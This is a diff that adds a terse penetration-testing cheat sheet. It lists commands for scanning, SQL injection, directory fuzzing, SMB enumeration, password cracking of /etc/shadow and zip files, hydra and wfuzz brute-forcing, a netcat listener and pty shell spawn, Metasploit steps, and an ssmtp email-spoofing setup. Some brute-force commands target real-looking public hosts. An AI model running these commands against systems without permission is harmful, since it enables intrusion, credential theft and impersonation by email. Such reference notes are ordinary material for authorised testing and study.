@@ -1,0 +1,113 @@
+########## ProtonVPN ###########
+protonvpn -c
+
+########## Nmap ###########
+nmap -sC -sV -o nmap 10.10.10.10
+nmap -p- -o nmap-all-ports 10.10.10.10
+nmap -sU -o nmap-udp 10.10.10.10
+
+
+########## SQLMap ###########
+sqlmap --wizard
+
+sqlmap -u "http://10.10.10.10" --method POST --data "Username=asd&Password=asd&submit=Login" -D blog --dump
+
+
+########## gobuster ###########
+gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -u http://10.10.10.191 -t 50 -x .php,.html,.txt,.js
+
+########## SMB ###########
+
+# List shares
+smbclient -L //10.10.10.10
+smbmap -H 10.10.10.10
+
+
+########## WFUZZ ###########
+
+# Fuzzing subdirectories
+wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hc 404,403 http://192.168.1.202/FUZZ
+
+# Fuzzing POST parameters
+wfuzz -c -w users.txt -w wordlist/others/common_pass.txt -d "uname=FUZZ&pass=FUZ2Z"  --hc 302 http://testphp.vulnweb.com/userinfo.php
+
+wfuzz -c --filter "c=200 and h>140"
+
+wfuzz -c -z permutation,abcdefghijklmnop1rstuvwxyz1234567890-4 --hc 302 -t 100 -d 'post_password=FUZZ&Submit=Parool' -H 'Host: olerohkem.ee' -H 'Referer: https://olerohkem.ee/strateegiapaevad/'  -u https://olerohkem.ee/wp-login.php?action=postpass
+
+########## Netcat ###########
+
+# Listen
+nc -nlvp 1234
+
+########## Remote shell ###########
+python3 -m http.server
+python -m SimpleHTTPServer 81
+python -c 'import pty:pty.spawn("/bin/bash")'
+
+
+########## John ###########
+# Crack /etc/shadow passwords
+unshadow /etc/passwd /etc/shadow > hashes.txt
+john hashes.txt
+
+# Crack zip file password
+zip2john [file].zip > hash.txt
+john --format=zip hash.txt
+john hash.txt
+
+
+########## Metasploit ###########
+msfconsole
+search
+use [full path]
+show options
+set LHOST
+expolit
+
+# Background Meterpreter shell
+ctrl + z
+use post/multi/recon/local_exploit_suggester
+run
+use
+
+ 
+########## Blue Teaming ###########
+ps -axjf # see running processes and their subprocesses
+w - Show who is logged on and what they are doing.
+find . -mmin -15 -ls 2>/dev/null (looks for files modified in the last 15 minutes)
+ss -antp (list all TCP connections and their PIDs) | grep ESTAB | grep -v '10.5.60.11'
+find . -type f -exec cat {} + (find all files recursively and cat them)
+
+########## fcrackzip ###########
+fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt [file].zip
+
+
+########## pdfcrack ###########
+pdfcrack [file] -w /usr/share/wordlists/rockyou.txt
+
+
+########## Hydra ###########
+hydra 159.65.208.41 -s 47567 -l asd -P /usr/share/wordlists/rockyou.txt  http-post-form "/index.php:password=^PASS^:Invalid password!"
+hydra -l soccer -P /usr/share/wordlists/rockyou.txt 192.168.6.2 ssh
+
+########## Mounting ###########
+
+# SMB share
+mount -t cifs //10.10.10.10/[Share name] /[mount location i.e. /mnt/smb]
+
+# .vhd file
+guestmount --add [file].vhd --inspector --ro -v [mount loc i.e /mnt/vhd]
+
+########## Brutespray ###########
+brutespray --file output -U /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt --threads 5 --hosts 5
+
+########## Email spoofing ###########
+In /etc/ssmtp/ssmtp.conf
+	UseSTARTTLS=YES
+	mailhub=mail.hot.ee:587
+	hostname=online.ee
+	FromLineOverride=YES
+	AuthUser=email@email.com
+	AuthPass=lisa_siia_pass
+ssmtp -v sinu.email@gmail.com < mail.txt
